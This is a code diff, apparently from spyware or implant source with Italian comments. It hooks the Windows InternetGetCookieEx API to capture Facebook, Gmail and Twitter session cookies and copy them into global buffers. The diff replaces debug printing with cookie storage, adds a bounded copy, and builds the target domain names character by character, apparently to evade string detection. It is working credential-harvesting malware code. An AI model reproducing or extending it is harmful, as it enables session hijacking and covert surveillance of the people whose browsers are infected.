@@ -412,12 +412,13 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 	DWORD origin;
 	DWORD old_flags;
 	DWORD old_size;
-	WCHAR facebook_url[] = { L'f', L'a', L'c', L'e', L'b', L'o', L'o', L'k', L'.', L'c', L'o', L'm', L'/', 0 };
-	WCHAR gmail_url[] = { L'm', L'a', L'i', L'l', L'.', L'g', L'o', L'o', L'g', L'l', L'e', L'.', L'c', L'o', L'm', L'/', 0 };
-	WCHAR twitter_url[] = { L't', L'w', L'i', L't', L't', L'e', L'r', L'.', L'c', L'o', L'm', L'/', 0 };
 
 	MARK_HOOK
 	INIT_WRAPPER(InternetGetCookieExStruct)
+
+	WCHAR facebook_url[] = { L'f', L'a', L'c', L'e', L'b', L'o', L'o', L'k', L'.', L'c', L'o', L'm', L'/', 0 };
+	WCHAR gmail_url[] = { L'm', L'a', L'i', L'l', L'.', L'g', L'o', L'o', L'g', L'l', L'e', L'.', L'c', L'o', L'm', L'/', 0 };
+	WCHAR twitter_url[] = { L't', L'w', L'i', L't', L't', L'e', L'r', L'.', L'c', L'o', L'm', L'/', 0 };
 
 	// Cerca di capire se si tratta di un dominio interessante
 	origin = COOKIE_IEXPLORER;
@@ -499,18 +500,24 @@ DWORD __stdcall PM_UrlLogDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FILETI
 	// Testo con e senza ricordati di me su tutti e 3 i social network
 
 	DWORD origin = COOKIE_MASK;
+	DWORD size = sizeof(FACEBOOK_IE_COOKIE)-sizeof(WCHAR);
 	origin = dwFlags & (~origin);
 	if (origin == COOKIE_IEXPLORER) {
 		origin = dwFlags & COOKIE_MASK;
+		if (size > dwLen)
+			size = dwLen;
+
 		if (origin == COOKIE_FACEBOOK) {
-			OutputDebugStringW(L"Cookie FACEBOOK:");
-			OutputDebugStringW((WCHAR *)msg);
+			ZeroMemory(FACEBOOK_IE_COOKIE, sizeof(FACEBOOK_IE_COOKIE));	
+			memcpy(FACEBOOK_IE_COOKIE, msg, size);
+
 		} else if (origin == COOKIE_TWITTER) {
-			OutputDebugStringW(L"Cookie TWITTER:");
-			OutputDebugStringW((WCHAR *)msg);
+			ZeroMemory(TWITTER_IE_COOKIE, sizeof(TWITTER_IE_COOKIE));
+			memcpy(TWITTER_IE_COOKIE, msg, size);
+
 		} else if (origin == COOKIE_GMAIL) {
-			OutputDebugStringW(L"Cookie GMAIL:");
-			OutputDebugStringW((WCHAR *)msg);
+			ZeroMemory(GMAIL_IE_COOKIE, sizeof(GMAIL_IE_COOKIE));
+			memcpy(GMAIL_IE_COOKIE, msg, size);
 		} 
 		return 1;
 	}
